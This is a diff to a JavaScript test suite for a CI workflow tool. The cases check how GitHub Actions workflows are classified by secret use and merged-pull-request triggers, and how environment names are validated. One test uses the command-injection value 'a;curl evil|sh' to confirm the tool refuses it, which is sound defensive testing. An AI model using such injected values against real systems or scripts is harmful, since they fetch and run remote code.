@@ -386,19 +386,61 @@ export default {
       expect: (tree, t) => t.exists(WF),
     })),
     ...[
-      ['on: push', 'dbmate --url postgres://postgres@localhost/test up', '', true],
-      ['on: [push, pull_request]', 'dbmate --url postgres://postgres@localhost/test up', '# not ${{ secrets.X }}, a comment\n', true],
-      ['on: push', 'dbmate up', '    env:\n      DATABASE_URL: ${{ secrets.DB }}\n', false],
-      ['on: push', 'dbmate up', "    env:\n      DATABASE_URL: ${{ secrets['DB'] }}\n", false],
-    ].map(([on, command, extra, keeps]) => ({
-      name: `\`${command}\` on ${on}${extra ? ` with ${extra.trim().split('\n').at(-1).trim()}` : ''}: ${keeps ? 'a test, and the owned workflow stays' : 'it holds a credential, so a pipeline'}`,
+      ['a plain test', 'on: push\njobs:\n  t:\n    steps:\n      - run: dbmate --url postgres://postgres@localhost/test up\n', true],
+      ['a secret named only in a comment', 'on: [push, pull_request]\n# ${{ secrets.X }}\njobs:\n  t:\n    steps:\n      - run: dbmate up\n', true],
+      ['a coverage token in another job', 'on: push\njobs:\n  t:\n    steps:\n      - run: dbmate up\n  c:\n    env:\n      TOKEN: ${{ secrets.CODECOV_TOKEN }}\n    steps:\n      - run: upload\n', true],
+      ['a coverage token handed to an action in the same job', 'on: push\njobs:\n  t:\n    steps:\n      - run: dbmate up\n      - uses: codecov/codecov-action@v5\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n', true],
+      ['a file called secrets.txt', 'on: push\njobs:\n  t:\n    steps:\n      - run: cat secrets.txt\n      - run: dbmate up\n', true],
+      ['a string literal saying secrets', "on: push\njobs:\n  t:\n    env:\n      A: ${{ format('secrets.x') }}\n    steps:\n      - run: dbmate up\n", true],
+      ['the step holding one', 'on: push\njobs:\n  d:\n    steps:\n      - run: dbmate up\n        env:\n          DATABASE_URL: ${{ secrets.DB }}\n', false],
+      ['the job holding one', "on: push\njobs:\n  d:\n    env:\n      DATABASE_URL: ${{ secrets['DB'] }}\n    steps:\n      - run: dbmate up\n", false],
+      ['the workflow holding one', 'on: push\nenv:\n  DATABASE_URL: ${{ secrets.DB }}\njobs:\n  d:\n    steps:\n      - run: dbmate up\n', false],
+      ['toJSON(secrets)', 'on: push\njobs:\n  d:\n    steps:\n      - run: dbmate up\n        env:\n          ALL: ${{ toJSON(secrets) }}\n', false],
+      ['an earlier step writing one to the job env', 'on: push\njobs:\n  d:\n    steps:\n      - run: echo "DATABASE_URL=${{ secrets.DB }}" >> "$GITHUB_ENV"\n      - run: dbmate up\n', false],
+      ['a merged pull request', 'on:\n  pull_request:\n    types: [closed]\njobs:\n  d:\n    if: github.event.pull_request.merged\n    env:\n      DATABASE_URL: ${{ secrets.DB }}\n    steps:\n      - run: dbmate up\n', false],
+    ].map(([what, workflow, keeps]) => ({
+      name: `\`dbmate up\` with ${what}: ${keeps ? 'a test, and the owned workflow stays' : 'it holds a credential, so a pipeline'}`,
       setup: () => {
         const tree = fixture(lines(['main', 'production', {}]))();
-        tree.write('.github/workflows/own.yml', `${on}\njobs:\n  d:\n${extra}    steps:\n      - run: ${command}\n`);
+        tree.write('.github/workflows/own.yml', workflow);
         return tree;
       },
       run: withFake(['nx', 'node', 'ci']),
       expect: (tree, t) => (keeps ? t.exists(WF) : t.missing(WF)),
+    })),
+    ...[
+      ['a merged pull request', 'on:\n  pull_request:\n    types: [closed]\njobs:\n  d:\n    steps:\n      - run: nx affected -t deploy\n', false],
+      ['a merged pull request among others', 'on:\n  pull_request:\n    types: [opened, closed]\njobs:\n  d:\n    steps:\n      - run: nx affected -t deploy\n', false],
+      ['a pull request of the ordinary types', 'on:\n  pull_request:\n    types: [opened, synchronize]\njobs:\n  d:\n    steps:\n      - run: nx affected -t deploy\n', true],
+    ].map(([what, workflow, keeps]) => ({
+      name: `\`nx affected -t deploy\` on ${what}: ${keeps ? 'deploys no line' : 'a pipeline'}`,
+      setup: () => {
+        const tree = fixture(lines(['main', 'production', {}]))();
+        tree.write('.github/workflows/own.yml', workflow);
+        return tree;
+      },
+      run: withFake(['nx', 'node', 'ci']),
+      expect: (tree, t) => (keeps ? t.exists(WF) : t.missing(WF)),
+    })),
+    ...[
+      ['prod eu (x)', false],
+      ['a;curl evil|sh', false],
+      ['prod.eu:1-a', true],
+    ].map(([environment, renders]) => ({
+      name: `an environment called \`${environment}\`: ${renders ? 'renders shell that parses, since the model allows only safe characters' : 'refused by the model, so it never reaches a script'}`,
+      setup: fixture(lines(['main', environment, {}])),
+      run: async (tree, ctx) => {
+        try {
+          await withFake(['nx', 'node', 'ci'])(tree, ctx);
+        } catch (error) {
+          ctx.error = error.message;
+        }
+      },
+      expect: (tree, t, ctx) => {
+        if (!renders) return t.ok(/must name an environment/.test(ctx.error ?? '') && !tree.exists(WF), `said: ${ctx.error}`);
+        const script = requireFromRepo('yaml').parse(tree.read(WF, 'utf8')).jobs.resolve.steps.find((step) => /environment=/.test(step.run ?? '')).run;
+        t.ok(spawnSync('bash', ['-n'], { input: script }).status === 0, script);
+      },
     })),
     {
       name: 'a signal in a comment is not a pipeline',
